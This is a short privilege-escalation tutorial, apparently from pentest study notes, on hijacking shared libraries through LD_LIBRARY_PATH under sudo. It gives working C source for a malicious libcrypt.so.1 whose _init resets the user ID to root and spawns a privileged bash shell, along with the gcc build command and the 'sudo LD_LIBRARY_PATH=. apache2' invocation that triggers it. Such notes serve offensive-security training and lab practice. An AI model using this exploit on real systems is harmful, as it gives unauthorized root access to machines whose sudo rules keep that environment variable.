# LD\_LIBRARY\_PATH

The LD\_LIBRARY\_PATH environment variable contains a set of directories where shared libraries are searched for first.

The ldd command can be used to print the shared libraries used by a program:

#### `ldd /usr/sbin/apache2`

By creating a shared library with the same name as one used by a program, and setting LD\_LIBRARY\_PATH to its parent directory, the program will load our shared library instead.

Run ldd against the apache2 program file:

#### `ldd /usr/sbin/apache2`

![](<../../../../.gitbook/assets/1 (21).png>)

Hijacking shared objects using this method is hit or miss. Choose one from the list and try it (libcrypt.so.1 seems to work well).

Create a file (library\_path.c) with the following contents:

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setresuid(0,0,0);
system("/bin/bash -p");
}

```

Compile library\_path.c into libcrypt.so.1:

#### `gcc -o libcrypt.so.1 -shared -fPIC library_path.c`

Run apache2 using sudo, while setting the LD\_LIBRARY\_PATH environment variable to the current path (where we compiled library\_path.c):

#### `sudo LD_LIBRARY_PATH=. apache2`
